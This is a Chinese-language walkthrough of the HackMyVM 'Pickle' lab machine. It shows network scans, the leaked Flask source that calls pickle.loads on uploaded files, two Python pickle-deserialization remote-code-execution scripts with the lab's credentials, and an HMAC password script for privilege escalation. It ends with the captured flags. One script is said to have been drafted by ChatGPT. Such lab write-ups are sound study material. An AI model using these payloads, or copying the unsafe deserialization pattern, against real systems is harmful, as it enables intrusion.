---
title: hackmyvm Pickle靶机复盘
author: LingMj
data: 2025-04-08
categories: [hackmyvm]
tags: [upload]
description: 难度-Hard
---

## 网段扫描

```
root@LingMj:~# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:d1:27:55, IPv4: 192.168.137.190
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.137.1	3e:21:9c:12:bd:a3	(Unknown: locally administered)
192.168.137.191	3e:21:9c:12:bd:a3	(Unknown: locally administered)
192.168.137.203	a0:78:17:62:e5:0a	Apple, Inc.

6 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.021 seconds (126.67 hosts/sec). 3 responded
```

## 端口扫描

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-08 07:51 EDT
Nmap scan report for pickle.mshome.net (192.168.137.191)
Host is up (0.0089s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0            1306 Oct 12  2020 init.py.bak
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.137.190
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
1337/tcp open  http    Werkzeug httpd 1.0.1 (Python 2.7.16)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| http-auth: 
| HTTP/1.0 401 UNAUTHORIZED\x0D
|_  Basic realm=Pickle login
|_http-server-header: Werkzeug/1.0.1 Python/2.7.16
MAC Address: 3E:21:9C:12:BD:A3 (Unknown)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.74 seconds
                                                             
```

## 获取webshell

![picture 0](../assets/images/560a923f1e194240d977905cde4c3fcc659f7b36956205ae603dcc9ae2385207.png)  


```
from functools import wraps
from flask import *
import hashlib
import socket
import base64
import pickle
import hmac

app = Flask(__name__, template_folder="templates", static_folder="/opt/project/static/")

@app.route('/', methods=["GET", "POST"])
def index_page():
	'''
		__index_page__()
	'''
	if request.method == "POST" and request.form["story"] and request.form["submit"]:
		md5_encode = hashlib.md5(request.form["story"]).hexdigest()
		paths_page  = "/opt/project/uploads/%s.log" %(md5_encode)
		write_page = open(paths_page, "w")
		write_page.write(request.form["story"])

		return "The message was sent successfully!"

	return render_template("index.html")

@app.route('/reset', methods=["GET", "POST"])
def reset_page():
	'''
		__reset_page__()
	'''
	pass


@app.route('/checklist', methods=["GET", "POST"])
def check_page():
	'''
		__check_page__()
	'''
	if request.method == "POST" and request.form["check"]:
		path_page    = "/opt/project/uploads/%s.log" %(request.form["check"])
		open_page    = open(path_page, "rb").read()
		if "p1" in open_page:
			open_page = pickle.loads(open_page)
			return str(open_page)
		else:
			return open_page
	else:
		return "Server Error!"

	return render_template("checklist.html")

if __name__ == '__main__':
	app.run(host='0.0.0.0', port=1337, debug=True)
```

![picture 1](../assets/images/4ed3f64308985364b7875edac56ab8386f953518cce053bb62c7a228b2193f23.png)  
![picture 2](../assets/images/57721b42f7602492a61e2e60a52a3d390aae809f054fc06d6212b0e17bf6c261.png)  

>密码爆破失败了
>

![picture 4](../assets/images/e82f017142b41bf7db13fef47ff45c3ed4cead89e056eac2e0be0e556ef89510.png)  

![picture 3](../assets/images/30924e0a90ea0f75c5e8fff1de2decad5e5a384df40c27d14480c9538cfdb0da.png)  
![picture 5](../assets/images/3349202a6bb2f2c713e8995a7314bf4ec7e2bb6ea24b3324e0100afd8abe36ba.png)  

>发现UDP
>

![picture 6](../assets/images/87e20e32200929210882a6760e8bbcf48fef8610abb6b00e65291f1f7a6b9c6e.png)  
![picture 7](../assets/images/244c6703115ef791ccca49b6ca81e02336ecae936595f39cfb8c0733bcbdae8c.png)  

>要不是没ssh我直接登录了哈哈哈哈
>

![picture 8](../assets/images/fbf9086c4c71f8b286623998397f2b9241367e3a2086bc8e7278b9ac32bed1bb.png)  
![picture 9](../assets/images/0ca834f47caafed7831b32cd06834630693a757c385ae91ba3daf871bc18f3e8.png)  

>直接让gtp给我个反序列化计划
>

```
import requests
import hashlib
import pickle
import os
import base64

# 配置目标服务器和认证信息
TARGET_URL = "http://localhost:1337/"
AUTH_CREDENTIALS = "lucas:SuperSecretPassword123!"
COMMAND_TO_EXECUTE = "echo 'Success: RCE achieved!' > /tmp/rce_proof.txt"  # 测试命令

# 生成Basic认证头
auth_header = {
    "Authorization": f"Basic {base64.b64encode(AUTH_CREDENTIALS.encode()).decode()}"
}

class Exploit(object):
    def __reduce__(self):
        # 在此注入需要执行的系统命令
        return (os.system, (COMMAND_TO_EXECUTE,))

# 构造恶意Payload
def generate_payload():
    # 使用协议0确保ASCII兼容性
    pickled = pickle.dumps(Exploit(), protocol=0)
    # 添加触发反序列化的前缀
    return b"p1" + pickled

# 计算Payload的MD5哈希
payload = generate_payload()
md5_hash = hashlib.md5(payload).hexdigest()

# 步骤1：上传恶意Payload
print("[*] Uploading malicious payload...")
upload_response = requests.post(
    TARGET_URL,
    headers=auth_header,
    data={"story": payload.decode('latin1'), "submit": "Submit"},  # 转换payload为字符串
    verify=False  # 忽略SSL证书验证（如果有需要）
)
if "successfully" not in upload_response.text:
    print("[!] Payload upload failed:", upload_response.text)
    exit(1)

print("[+] Payload successfully uploaded. MD5:", md5_hash)

# 步骤2：触发反序列化执行
print("[*] Triggering deserialization...")
trigger_response = requests.post(
    f"{TARGET_URL}checklist",
    headers=auth_header,
    data={"check": md5_hash},
    verify=False
)

print("[+] Server response:", trigger_response.text)
```

>不知道能不能成功让gtp一直改就行
>


>好吧不行我去找大佬脚本利用了，gtp构造失败我也不想写
>

```
#coding:utf-8
import os
import cPickle
import hashlib
import requests


class CommandExecute(object):
        def __reduce__(self):
                return (os.system, ('ping -c 1 192.168.137.190',))

convert_data = cPickle.dumps(CommandExecute())
convert_crypt = hashlib.md5(convert_data).hexdigest()
send_requests = requests.post('http://192.168.137.191:1337/', data={"story":convert_data, "submit":"Submit+Query"}, auth=("lucas", "SuperSecretPassword123!"))
check_requests = requests.post('http://192.168.137.191:1337/checklist', data={"check":convert_crypt}, auth=("lucas", "SuperSecretPassword123!"))
print(check_requests.text)
```

>这个是python2不是python3
>

![picture 10](../assets/images/5185fe07f80402a2415da872650fe94c7f651e0000bd821e72edf0d06b571f8b.png)  
![picture 11](../assets/images/624f22b79c52838d8c8d98ad12aa2bdb9a7b732cae121ecc0ff3cf830ed03787.png)  

>我直接执行busybox
>


## 提权

![picture 12](../assets/images/4929f443cc1f1dd2adb4ea0e5e71d7816ddbc7b202ff60098c02268f965384b6.png)  
![picture 13](../assets/images/abf7a40664b371d392a63618a65f6730a43bed6bb437c041080297f2990e82a0.png)  

>我直接工具,找了半天没找到提权我看看wp了
>

![picture 14](../assets/images/449c2862ef7a15df9f27d3f640474351e1fa22b21137e9f44969705021b0e2be.png)  
![picture 15](../assets/images/3e56bcad33d74012de9c45e617aeb07a6e49fea838eb2a6006ba6dcc96b50996.png)  

>脚本
>

```
import hashlib
import socket
import base64
import hmac

user=['lucas', 'mark']
for i in user:
    key = "dpff43f3p214k31301"
    raw = i + key + socket.gethostbyname(socket.gethostname())
    hashed = hmac.new(key, raw, hashlib.sha1)
    print("[+] USER:",i)
    print(base64.b64encode(hashed.digest().encode("base64").rstrip("\n")))
```

![picture 16](../assets/images/7a7f5ba362f3a17c68134addb6dbae2ca3f9aeea7ab02c50448c192c8db6ea6b.png)  
![picture 17](../assets/images/6a9777f57d726a5fd3ee197ba876a6385f0bbf7fde558089f777fc41cce35f81.png)  

>失败了算了，我直接找内核方法了
>

![picture 18](../assets/images/e6ae9d3efe2b92a0b77ff683e0a2a0de3ad237a9aa851d5c2a1e896aa3e7d02d.png)  
![picture 19](../assets/images/2af569d7cd0b9d1e889e58a4626a2d1003cbec83d101f314cfe013f6d9c343f9.png)  
![picture 20](../assets/images/e013e9ce5458309e8753d2f0f10fa87b44d5cd2cb2b466a25884dd49fc24b2b3.png)  

![picture 21](../assets/images/21ae49f3a6461985c8b6e4415adb34462edd9ccbc4501833d9038af20459c965.png)  

>我不想在重新安装靶机去弄了已经改不回去了选择这个方式结束，等无聊再弄一下，搁置常规方法
>


>userflag:e25fd1b9248d1786551e3412adc74f6f
>
>rootflag:7a32c9739cc63ed983ae01af2577c01c
>